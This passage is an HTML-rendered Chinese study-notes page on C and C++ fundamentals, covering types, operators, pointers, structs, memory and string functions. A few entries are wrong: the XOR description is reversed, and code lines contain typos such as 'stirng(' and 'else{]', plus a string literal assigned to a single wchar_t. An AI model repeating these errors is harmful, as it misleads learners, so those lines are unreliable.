class="keyword">define</span> a x+x</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; a * a &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="comment">// 输出35，因为实际上是表达式拼接，所以是输出x+x*x+x的值。</span></span><br></pre></td></tr></table></figure><h3 id="1-变量"><a href="#1-变量" class="headerlink" title="1 变量"></a>1 变量</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 整形（整数类型）</span></span><br><span class="line"><span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="type">short</span> b = <span class="number">5</span>;</span><br><span class="line"><span class="type">long</span> c = <span class="number">20</span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> d = <span class="number">12</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 浮点型（小数类型）</span></span><br><span class="line"><span class="type">float</span> a = <span class="number">10.12</span>;</span><br><span class="line"><span class="type">double</span> b = <span class="number">12.24</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 布尔型（真或假）</span></span><br><span class="line"><span class="type">bool</span> a = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符型（直接表示出字符，注意字符是单引号）</span></span><br><span class="line"><span class="type">char</span> a = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串（实则是字符数组，注意是双引号）</span></span><br><span class="line"><span class="type">char</span> str[] = <span class="string">&quot;123&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数组（一堆数的集合）</span></span><br><span class="line"><span class="type">int</span> arr[] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line"><span class="type">char</span> arr[] = &#123;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 常量限定</span></span><br><span class="line"><span class="type">const</span> 数据类型 name = value;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 无符号整形</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> a = <span class="number">10</span>;</span><br></pre></td></tr></table></figure><h3 id="2-运算符"><a href="#2-运算符" class="headerlink" title="2 运算符"></a>2 运算符</h3><blockquote><p>数据运算</p></blockquote><div class="table-container"><table><thead><tr><th>算术运算符</th><th>术语</th><th>示例</th><th>结果</th></tr></thead><tbody><tr><td>+</td><td>正号</td><td>+3</td><td>3</td></tr><tr><td>-</td><td>负号</td><td>-3</td><td>-3</td></tr><tr><td>+</td><td>加</td><td>10 + 5</td><td>15</td></tr><tr><td>-</td><td>减</td><td>10 - 5</td><td>5</td></tr><tr><td>*</td><td>乘</td><td>10 * 5</td><td>50</td></tr><tr><td>/</td><td>除</td><td>10 / 5</td><td>2</td></tr><tr><td>%</td><td>取模(取余)</td><td>10 % 3</td><td>1</td></tr><tr><td>++</td><td>前置递增</td><td>a=2; b=++a;</td><td>a=3; b=3;</td></tr><tr><td>++</td><td>后置递增</td><td>a=2; b=a++;</td><td>a=3; b=2;</td></tr><tr><td>—</td><td>前置递减</td><td>a=2; b=—a;</td><td>a=1; b=1;</td></tr><tr><td>—</td><td>后置递减</td><td>a=2; b=a—;</td><td>a=1; b=2;</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>赋值运算符</th><th>术语</th><th>示例</th><th>结果</th></tr></thead><tbody><tr><td>=</td><td>赋值</td><td>a=2; b=3;</td><td>a=2; b=3;</td></tr><tr><td>+=</td><td>加等于</td><td>a=0; a+=2;</td><td>a=2;</td></tr><tr><td>-=</td><td>减等于</td><td>a=5; a-=3;</td><td>a=2;</td></tr><tr><td>*=</td><td>乘等于</td><td>a=2; a*=2;</td><td>a=4;</td></tr><tr><td>/=</td><td>除等于</td><td>a=4; a/=2;</td><td>a=2;</td></tr><tr><td>%=</td><td>模等于</td><td>a=3; a%2;</td><td>a=1;</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>比较运算符</th><th>术语</th><th>示例</th><th>结果</th></tr></thead><tbody><tr><td>==</td><td>相等于</td><td>4 == 3</td><td>0</td></tr><tr><td>!=</td><td>不等于</td><td>4 != 3</td><td>1</td></tr><tr><td>&lt;</td><td>小于</td><td>4 &lt; 3</td><td>0</td></tr><tr><td>></td><td>大于</td><td>4 &gt; 3</td><td>1</td></tr><tr><td>&lt;=</td><td>小于等于</td><td>4 &lt;= 3</td><td>0</td></tr><tr><td>>=</td><td>大于等于</td><td>4 &gt;= 1</td><td>1</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>逻辑运算符</th><th>术语</th><th>示例</th><th>结果</th></tr></thead><tbody><tr><td><code>!</code></td><td>非</td><td><code>!a</code></td><td>如果a为假，则!a为真；  如果a为真，则!a为假。</td></tr><tr><td><code>&amp;&amp;</code></td><td>与</td><td><code>a &amp;&amp; b</code></td><td>如果a和b都为真，则结果为真，否则为假。</td></tr><tr><td>`</td><td></td><td>`</td><td>或</td><td>`a</td><td></td><td>b`</td><td>如果a和b有一个为真，则结果为真，二者都为假时，结果为假。</td></tr><tr><td><code>&amp;</code></td><td>按位与</td><td><code>a &amp; b</code></td><td>a和b每一位做与运算，全真为1，否则为0</td></tr><tr><td>`</td><td>`</td><td>按位或</td><td>`a</td><td>b`</td><td>a和b每一位做或运算，全假为0，否则为1</td></tr><tr><td><code>^</code></td><td>按位异或</td><td><code>a ^ b</code></td><td>a和b每一位做异或运算，相同为1，相反为0</td></tr></tbody></table></div><h3 id="3-输入输出"><a href="#3-输入输出" class="headerlink" title="3 输入输出"></a>3 输入输出</h3><blockquote><p><a href="https://www.cnblogs.com/wucongzhou/p/12498790.html#3对齐标志flags">格式化输出</a></p></blockquote><div class="table-container"><table><thead><tr><th><strong>转义字符</strong></th><th><strong>含义</strong></th><th><strong>ASCII</strong>码值（十进制）</th></tr></thead><tbody><tr><td><code>\a</code></td><td>警报</td><td>007</td></tr><tr><td><code>\b</code></td><td>退格(BS) ，将当前位置移到前一列</td><td>008</td></tr><tr><td><code>\f</code></td><td>换页(FF)，将当前位置移到下页开头</td><td>012</td></tr><tr><td><strong><code>\n</code></strong></td><td><strong>换行(LF) ，将当前位置移到下一行开头</strong></td><td><strong>010</strong></td></tr><tr><td><code>\r</code></td><td>回车(CR) ，将当前位置移到本行开头</td><td>013</td></tr><tr><td><strong><code>\t</code></strong></td><td><strong>水平制表(HT)  （跳到下一个TAB位置）</strong></td><td><strong>009</strong></td></tr><tr><td><code>\v</code></td><td>垂直制表(VT)</td><td>011</td></tr><tr><td><strong><code>\\</code></strong></td><td><strong>代表一个反斜线字符”\”</strong></td><td><strong>092</strong></td></tr><tr><td><code>&#39;</code></td><td>代表一个单引号（撇号）字符</td><td>039</td></tr><tr><td><code>&quot;</code></td><td>代表一个双引号字符</td><td>034</td></tr><tr><td><code>\?</code></td><td>代表一个问号</td><td>063</td></tr><tr><td><code>\0</code></td><td>数字0</td><td>000</td></tr><tr><td><code>\ddd</code></td><td>8进制转义字符，d范围0~7</td><td>3位8进制</td></tr><tr><td><code>\xhh</code></td><td>16进制转义字符，h范围<code>0~9，a~f，A~F</code></td><td>3位16进制</td></tr></tbody></table></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 输入</span></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d %d&quot;</span>,a,b);</span><br></pre></td></tr></table></figure><h3 id="4-判断"><a href="#4-判断" class="headerlink" title="4 判断"></a>4 判断</h3><blockquote><p>执行满足条件的语句</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// if判断</span></span><br><span class="line"><span class="keyword">if</span>() &#123;&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>() &#123;&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;]</span><br><span class="line">    </span><br><span class="line"><span class="comment">// switch判断</span></span><br><span class="line"><span class="keyword">switch</span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:<span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:<span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">&#125;</span><br><span class="line">     </span><br><span class="line"><span class="comment">// 三目运算符，真返回t值，假返回f值</span></span><br><span class="line">c = a &gt; b ? t : f;</span><br></pre></td></tr></table></figure><h3 id="5-循环"><a href="#5-循环" class="headerlink" title="5 循环"></a>5 循环</h3><blockquote><p>多次重复执行同一段语句</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>()&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>()&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span>&#123;&#125; <span class="keyword">while</span>()</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 立刻结束循环</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="comment">// 跳过后续语句继续循环</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br></pre></td></tr></table></figure><h3 id="6-数组"><a href="#6-数组" class="headerlink" title="6 数组"></a>6 数组</h3><blockquote><p>存放相同数据元素的集合</p><p>索引从0开始</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 一维数组</span></span><br><span class="line"><span class="type">int</span> nums[<span class="number">10</span>];</span><br><span class="line"><span class="type">char</span> strs[<span class="number">10</span>];</span><br><span class="line"><span class="type">int</span> score[<span class="number">10</span>] = &#123; <span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 二维数组</span></span><br><span class="line"><span class="type">int</span> arr[<span class="number">2</span>][<span class="number">3</span>] = &#123; &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;,&#123;<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125; &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 多维数组</span></span><br><span class="line"><span class="type">int</span> lst[<span class="number">1</span>][<span class="number">2</span>][<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 省略长度</span></span><br><span class="line"><span class="type">int</span> score[] = &#123; <span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 省略行数（列数不可省略）</span></span><br><span class="line"><span class="type">int</span> arr[][<span class="number">3</span>] = &#123;&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;, &#123;<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 访问数组</span></span><br><span class="line">nums[i];</span><br><span class="line">nums[i][j];</span><br></pre></td></tr></table></figure><h3 id="7-函数"><a href="#7-函数" class="headerlink" title="7 函数"></a>7 函数</h3><blockquote><p>实现代码复用</p><p>形参：函数内部新建的参数。</p><p>实参：函数外传入的参数。</p><p>exit 函数：<a href="https://www.cnblogs.com/shuopython/p/15318764.html">链接</a></p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 函数定义</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数声明（可以多次声明但是不能多次定义）</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数返回</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span>&#123; <span class="keyword">return</span> num; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数调用</span></span><br><span class="line">func();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 值传递（不改变实参值）</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span> num1, <span class="type">int</span> num2)</span>;</span><br><span class="line">swap(a, b);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 地址传递（改变实参值）</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">swap2</span><span class="params">(<span class="type">int</span> * p1, <span class="type">int</span> *p2)</span>;</span><br><span class="line">swap2(&amp;a, &amp;b); <span class="comment">// 传入地址</span></span><br></pre></td></tr></table></figure><h3 id="8-文件"><a href="#8-文件" class="headerlink" title="8 文件"></a>8 文件</h3><blockquote><p>持久化存储</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// mode:r,w,a,b,+</span></span><br><span class="line">FILE *fp = fopen(<span class="string">&quot;path&quot;</span>,mode);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读</span></span><br><span class="line"><span class="built_in">fscanf</span>(fp,<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line"><span class="comment">// 读一行</span></span><br><span class="line">fgets(buf,size(buf),fp);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写</span></span><br><span class="line"><span class="built_in">fprintf</span>(fp,<span class="string">&quot;%d&quot;</span>,num);</span><br><span class="line"><span class="comment">// 写字符串</span></span><br><span class="line"><span class="built_in">fputs</span>(buf,fp);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭文件</span></span><br><span class="line">fclose(fp);</span><br></pre></td></tr></table></figure><h3 id="9-指针"><a href="#9-指针" class="headerlink" title="9 指针"></a>9 指针</h3><blockquote><p>可以通过指针间接访问内存</p><p>指针所占地址：所有数据类型的指针，x86是4B，x64是8B</p><p>空指针：指针变量指向内存中编号为0的空间</p><p>野指针：指针变量指向非法的内存空间</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义指针</span></span><br><span class="line"><span class="type">int</span>* p;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指针赋值</span></span><br><span class="line">p = &amp;a;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用值（*p是指针值，p是指针地址）</span></span><br><span class="line">*p;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 空指针</span></span><br><span class="line"><span class="type">int</span>* p = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指向数组首个元素</span></span><br><span class="line"><span class="type">int</span> *p = arr;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 指针遍历数组</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, *p);</span><br><span class="line">    p++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-结构体"><a href="#10-结构体" class="headerlink" title="10 结构体"></a>10 结构体</h3><blockquote><p>将一组数据组合成一个整体</p><p>结构体指针使用：先要指向一个结构体</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 结构体定义</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="comment">//成员列表</span></span><br><span class="line"><span class="built_in">string</span> name;  <span class="comment">//姓名</span></span><br><span class="line"><span class="type">int</span> age;      <span class="comment">//年龄</span></span><br><span class="line"><span class="type">int</span> score;    <span class="comment">//分数</span></span><br><span class="line">&#125;stu3; <span class="comment">// 结构体变量创建方式3</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//结构体变量创建方式1</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">stu1</span>;</span> <span class="comment">// struct关键字可以省略</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//结构体变量创建方式2</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">stu2</span> =</span> &#123; <span class="string">&quot;李四&quot;</span>,<span class="number">19</span>,<span class="number">60</span> &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 结构体值赋值</span></span><br><span class="line">stu1.name = <span class="string">&quot;张三&quot;</span>;</span><br><span class="line">stu1.age = <span class="number">18</span>;</span><br><span class="line">stu1.score = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,stu1.age);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 结构体数组</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">arr</span>[3]=</span></span><br><span class="line">&#123;</span><br><span class="line">    &#123;<span class="string">&quot;张三&quot;</span>,<span class="number">18</span>,<span class="number">80</span> &#125;,</span><br><span class="line">    &#123;<span class="string">&quot;李四&quot;</span>,<span class="number">19</span>,<span class="number">60</span> &#125;,</span><br><span class="line">    &#123;<span class="string">&quot;王五&quot;</span>,<span class="number">20</span>,<span class="number">70</span> &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 结构体指针</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">stu</span> =</span> &#123; <span class="string">&quot;张三&quot;</span>,<span class="number">18</span>,<span class="number">100</span>, &#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> * <span class="title">p</span> =</span> &amp;stu;</span><br><span class="line">p-&gt;score = <span class="number">80</span>; <span class="comment">// 指针通过 -&gt; 操作符访问成员</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 结构体嵌套</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="built_in">string</span> name;</span><br><span class="line"><span class="type">int</span> age;</span><br><span class="line"><span class="type">int</span> score;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">teacher</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">int</span> id;</span><br><span class="line"><span class="built_in">string</span> name;</span><br><span class="line"><span class="type">int</span> age;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">stu</span>;</span> <span class="comment">// 子结构体</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 嵌套结构体的调用</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">teacher</span> <span class="title">t1</span>;</span></span><br><span class="line">t1.stu.name = <span class="string">&quot;张三&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// const限定值不能被修改</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">printStudent</span><span class="params">(<span class="type">const</span> student *stu)</span>;</span><br></pre></td></tr></table></figure><h3 id="11-内存"><a href="#11-内存" class="headerlink" title="11 内存"></a>11 内存</h3><blockquote><p>malloc申请内存：</p><ul><li>需要给定空间大小。并且malloc返回的是(void*)，需要将指针强制转换成对应指针类型。</li></ul></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 某类型所占空间</span></span><br><span class="line"><span class="keyword">sizeof</span>(<span class="type">int</span>);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;short 类型所占内存空间为： &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(<span class="type">short</span>) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 申请内存</span></span><br><span class="line"><span class="type">int</span> *arr;</span><br><span class="line">arr = (<span class="type">int</span>*)<span class="built_in">malloc</span>(size * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放内存</span></span><br><span class="line"><span class="built_in">free</span>(arr);</span><br></pre></td></tr></table></figure><hr><h2 id="二、C-基础"><a href="#二、C-基础" class="headerlink" title="二、C++基础"></a>二、C++基础</h2><h3 id="0-工程包含"><a href="#0-工程包含" class="headerlink" title="0 工程包含"></a>0 工程包含</h3><blockquote><p>多个cpp包含同一个头文件。</p><p>头文件中有#pragma once且只有声明，不能有定义，否则会多次包含。</p><ul><li>extern int a：全局声明。</li><li>int a：定义。</li></ul></blockquote><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// example.h（声明类、结构体、函数）</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> EXAMPLE_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EXAMPLE_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明一个结构体</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Point</span> &#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="type">int</span> y;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明一个类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Rectangle</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> width;</span><br><span class="line">    <span class="type">int</span> height;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Rectangle</span>(<span class="type">int</span> w, <span class="type">int</span> h);  <span class="comment">// 声明构造函数</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getArea</span><span class="params">()</span></span>;            <span class="comment">// 声明成员函数</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明一个全局函数</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// example.cpp（实现类、函数）</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;example.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 类的构造函数的定义</span></span><br><span class="line">Rectangle::<span class="built_in">Rectangle</span>(<span class="type">int</span> w, <span class="type">int</span> h) &#123;</span><br><span class="line">    width = w;</span><br><span class="line">    height = h;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 类的成员函数的定义</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Rectangle::getArea</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> width * height;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局函数的定义</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main.cpp（实例化类、结构体，调用函数）</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;example.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 实例化一个类对象</span></span><br><span class="line">    <span class="function">Rectangle <span class="title">rect</span><span class="params">(<span class="number">5</span>, <span class="number">3</span>)</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 调用类的成员函数</span></span><br><span class="line">    <span class="type">int</span> area = rect.<span class="built_in">getArea</span>();</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Area: &quot;</span> &lt;&lt; area &lt;&lt; std::endl;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 使用结构体</span></span><br><span class="line">    Point p;</span><br><span class="line">    p.x = <span class="number">10</span>;</span><br><span class="line">    p.y = <span class="number">20</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Point: (&quot;</span> &lt;&lt; p.x &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; p.y &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 调用全局函数</span></span><br><span class="line">    <span class="type">int</span> sum = <span class="built_in">add</span>(<span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Sum: &quot;</span> &lt;&lt; sum &lt;&lt; std::endl;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-基本使用"><a href="#1-基本使用" class="headerlink" title="1 基本使用"></a>1 基本使用</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;    <span class="comment">// stdio.h</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Hello C++&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="comment">//std::cout &lt;&lt; &quot;Hello World!\n&quot;;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 引用命名空间，否则就是 namespace::function 使用</span></span><br><span class="line"><span class="comment">// 命名空间主要用于区分同名的函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 引用命名空间中的一个函数</span></span><br><span class="line"><span class="keyword">using</span> std::endl;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;!&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看版本（C++98:199711L，C++11:201103L，C++14:201402L）</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; __cplusplus &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-变量"><a href="#2-变量" class="headerlink" title="2 变量"></a>2 变量</h3><blockquote><p>大部分同C语言。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//必须带 f ，否则会变成 double 类型</span></span><br><span class="line"><span class="type">float</span> f1 = <span class="number">3.14f</span>;</span><br><span class="line"><span class="comment">//字符串类型 使用前应包含&lt;string&gt;头文件（VS2022不用）</span></span><br><span class="line">std::string str2 = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 宽字符。Windows中通常是16位无符号整数，采用UTF-16编码。Linux和Unix中通常是32位整数，采用UTF-32编码。L是宽字节常量。</span></span><br><span class="line"><span class="type">wchar_t</span> unichar = <span class="string">L&quot;Hello World!&quot;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// string字符串操作</span></span><br><span class="line"><span class="comment">// string -&gt; int</span></span><br><span class="line"><span class="type">int</span> num = <span class="built_in">stoi</span>(str);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造字符串</span></span><br><span class="line">string str = <span class="built_in">stirng</span>(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">string space = <span class="built_in">string</span>(<span class="number">10</span>,<span class="string">&#x27; &#x27;</span>); <span class="comment">// 依照数量构造</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// int -&gt; string</span></span><br><span class="line">string str = <span class="built_in">to_string</span>(num);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取子串（pos：起始位置，n：个数）</span></span><br><span class="line">s.<span class="built_in">substr</span>(<span class="type">int</span> pos = <span class="number">0</span>,<span class="type">int</span> n);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 寻找子串（str：子串，position：起始位置）</span></span><br><span class="line">s.<span class="built_in">find</span>(str,position);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串拼接</span></span><br><span 